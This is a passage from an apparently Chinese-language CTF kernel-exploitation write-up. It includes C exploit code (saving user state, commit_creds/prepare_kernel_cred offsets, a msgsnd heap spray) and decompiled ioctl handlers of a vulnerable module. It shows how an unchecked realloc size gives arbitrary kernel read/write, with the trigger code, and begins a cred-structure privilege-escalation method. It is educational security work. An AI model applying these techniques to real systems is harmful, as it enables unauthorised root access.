            setbuf(stderr,0);
    }
    size_t user_cs, user_rflags, user_ss, user_rsp;
    size_t native_write_cr4_addr = 0x64500;
    char* (*prepare_kernel_cred_addr)(int) = 0xA40B0;
    void (*commit_creds_addr)(char *) = 0xA3CC0;
    void save_user_status(){
        __asm__(
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
        );
        puts("[+] Save User Status");
        printf("user_cs = %pn",user_cs);
        printf("user_ss = %pn",user_ss);
        printf("user_rsp = %pn",user_rsp);
        printf("user_rflags = %pn",user_rflags);
        puts("[+] Save Success");
    }
    int heap_spray_msgsnd(int fd, size_t target, size_t arg){
        int new_len = BUFF_SIZE - 48;
        struct {
            size_t mtype;
            char mtext[new_len];
        } msg;
        memset(msg.mtext,0x42,new_len-1);
        memcpy(msg.mtext+56-48,&arg,sizeof(long));
        memcpy(msg.mtext+56-48+(sizeof(long)),&target,sizeof(long));
        msg.mtext[new_len]=0;
        msg.mtype=1; 
        int msqid=msgget(IPC_PRIVATE,0644 | IPC_CREAT);
        ioctl(fd, 0xFE03, NULL);
        ioctl(fd, 0xFE06, NULL);
        for (int i=0;i data，交互码`0x8008FE07`：**
    case 0x8008FE07:
    if ( !copy_from_user(&s_args, v3, 8LL) )
    {
        if ( !s_args )
            return 0LL;
        if ( *(&g_mem_buffer + 0x20000000) )
            return 0LL;
        g_mem_buffer = kmem_cache_alloc_trace(kmalloc_caches[5], 0x24000C0LL, 0x18LL);
        if ( !g_mem_buffer )
            return 0LL;
        g_mem_buffer->data = _kmalloc(s_args, 0x24000C0LL);
        if ( g_mem_buffer->data )
        {
            g_mem_buffer->data_size = s_args;
            g_mem_buffer->pos = 0LL;
            printk(&unk_6F8,g_mem_buffer->data_size); // 6[x] Allocated memory with size %lu [x]
        }
        else
        {
            kfree(g_mem_buffer);
        }
        return 0LL;
    }
    00000000 init_args       struc ; (sizeof=0x8, align=0x8, copyof_518)
    00000000 size            dq ?
    00000008 init_args       ends
    00000000 mem_buffer_0    struc ; (sizeof=0x18, align=0x8, copyof_517)
    00000000 data_size       dq ?
    00000008 data            dq ?                    ; offset
    00000010 pos             dq ?
    00000018 mem_buffer_0    ends
**依据`s_args ->
grow`是否被置位来决定是增加或是减少`g_mem_buffer->data_size`，并重新分配一个相应大小加一的chunk，交互码`0x8008FE08`：**
    case 0x8008FE08:
    if ( !copy_from_user(&s_args, v3, 16LL) && g_mem_buffer )
    {
        if ( s_args -> grow )
            new_size = g_mem_buffer->data_size + s_args -> size;
        else
            new_size = g_mem_buffer->data_size - s_args -> size;
        g_mem_buffer->data = (char *)krealloc(g_mem_buffer->data, new_size + 1, 0x24000C0LL);
        if ( !g_mem_buffer->data )
            return -12LL;
        g_mem_buffer->data_size = new_size;
        printk(&unk_728,g_mem_buffer->data_size); // 6[x] g_mem_buffer->data_size = %lu [x]
        return 0LL;
    }
    00000000 realloc_args    struc ; (sizeof=0x10, align=0x8, copyof_520)
    00000000 grow            dd ?
    00000004                 db ? ; undefined
    00000005                 db ? ; undefined
    00000006                 db ? ; undefined
    00000007                 db ? ; undefined
    00000008 size            dq ?
    00000010 realloc_args    ends
**从`g_mem_buffer->data[g_mem_buffer->pos]`处向用户传入的`buff`写`count`字节，交互码`0x8008FE09`：**
    if ( cmd != 0xC008FE09 )
        return 0LL;
    if ( !copy_from_user(&s_args, v3, 16LL) && g_mem_buffer )
    {
        pos = g_mem_buffer->pos;
        result = -22LL;
        if ( s_args -> count + pos data_size )
            result = copy_to_user(s_args -> buff, &g_mem_buffer->data[pos], s_args -> count);
        return result;
    }
    00000000 read_args       struc ; (sizeof=0x10, align=0x8, copyof_522)
    00000000 buff            dq ?                    ; offset
    00000008 count           dq ?
    00000010 read_args       ends
**依据用户输入更新`g_mem_buffer->pos`，交互码`0x8008FE0A`：**
    case 0x8008FE0A:
    if ( !copy_from_user(&s_args, v3, 8LL) )
    {
        result = -22LL;
        if ( g_mem_buffer )
        {
            v16 = (signed int)s_args;
            result = 0LL;
            if ( s_args -> new_pos data_size )
            {
                g_mem_buffer->pos =  s_args -> new_pos;
                result = v16;
            }
        }
        return result;
    }
    00000000 seek_args       struc ; (sizeof=0x8, align=0x8, copyof_524)
    00000000 new_pos         dq ?
    00000008 seek_args       ends
**向`g_mem_buffer->data[g_mem_buffer->pos]`处写`count`字节由用户传入的`buff`，交互码`0x8008FE0B`：**
    if ( cmd == 0x8008FE0B )
    {
        if ( !copy_from_user(&s_args, v3, 16LL) && g_mem_buffer )
        {
            result = -22LL;
            if ( s_args -> count + g_mem_buffer -> pos  data_size )
              result = copy_from_user(&g_mem_buffer->data[g_mem_buffer-> pos], 
                                      s_args -> buff, 
                                      s_args -> count);
            return result;
        }
    }
    00000000 write_args      struc ; (sizeof=0x10, align=0x8, copyof_526)
    00000000 buff            dq ?                    ; offset
    00000008 count           dq ?
    00000010 write_args      ends
很明显，在重分配逻辑中，模块没有对`new_size`进行检查，如果我们传入的`s_args ->
size`使得`new_size`为`-1`，程序将会接下来进行`kmalloc(0)`，随后我们会获得一个`0x10`大小的`Chunk`，但是随后我们的`g_mem_buffer
-> data_size`将会被更新为`0xFFFFFFFFFFFFFFFF`，这意味着我们拥有了任意地址写的能力。
我们触发任意地址写的代码是：
    struct init_args i_args;
    struct realloc_args r_args;
    i_args.size=0x100;
    ioctl(fd, 0x8008FE07, &i_args);
    r_args.grow = 0;
    r_args.size = 0x100 + 1;
    ioctl(fd, 0x8008FE08, &r_args);
    puts("[+] Now! We can read and write any memory! [+]");
### 第一种提权姿势-劫持`cred`结构体
#### 关于`cred`结构体
每个线程在内核中都对应一个线程栈，并由一个线程结构块`thread_info`去调度，`thread_info`结构体同时也包含了线程的一系列信息，它一般被存放位于线程栈的最低地址。
结构体定义在`/v4.6-rc1/source/arch/x86/include/asm/thread_info.h#L55`：
    struct thread_info {
        struct task_struct    *task;        /* main task structure */
        __u32                flags;        /* low level flags */
        __u32                status;        /* thread synchronous flags */
        __u32                cpu;        /* current CPU */
        mm_segment_t        addr_limit;
        unsigned int        sig_on_uaccess_error:1;
        unsigned int        uaccess_err:1;    /* uaccess failed */
    };
`thread_info`中最重要的成员是`task_struct`结构体,它被定义在`/v4.6-rc1/source/include/linux/sched.h#L1394`
    struct task_struct {
        volatile long state;    /* -1 unrunnable, 0 runnable, >0 stopped */
        void *stack;
        atomic_t usage;
        unsigned int flags;    /* per process flags, defined below */
        unsigned int ptrace;
        ......
        unsigned long nvcsw, nivcsw; /* context switch counts */
        u64 start_time;        /* monotonic time in nsec */
        u64 real_start_time;    /* boot based time in nsec */
        /* 
         * mm fault and swap info: this can arguably be seen as either 
         * mm-specific or thread-specific 
         */
        unsigned long min_flt, maj_flt;
        struct task_cputime cputime_expires;
        struct list_head cpu_timers[3];
        /* process credentials */
        // objective and real subjective task credentials (COW) 
        const struct cred __rcu *real_cred; 
        // effective (overridable) subjective task credentials (COW)
        const struct cred __rcu *cred;
        /*
         * executable name excluding path
         * - access with [gs]et_task_comm (which lockit with task_lock())
         * - initialized normally by setup_new_exec
         */
        char comm[TASK_COMM_LEN]; 
        /* file system info */
        struct nameidata *nameidata;
    #ifdef CONFIG_SYSVIPC
        /* ipc stuff */
        struct sysv_sem sysvsem;
        struct sysv_shm sysvshm;
    #endif
        ......
    };
`cred`结构体表示该线程的权限，它定义在`/v4.6-rc1/source/include/linux/cred.h#L118`
    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;            /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC    0x43736564
    #define CRED_MAGIC_DEAD    0x44656144
    #endif
        kuid_t        uid;                    /* real UID of the task */
        kgid_t        gid;                    /* real GID of the task */
        kuid_t        suid;                    /* saved UID of the task */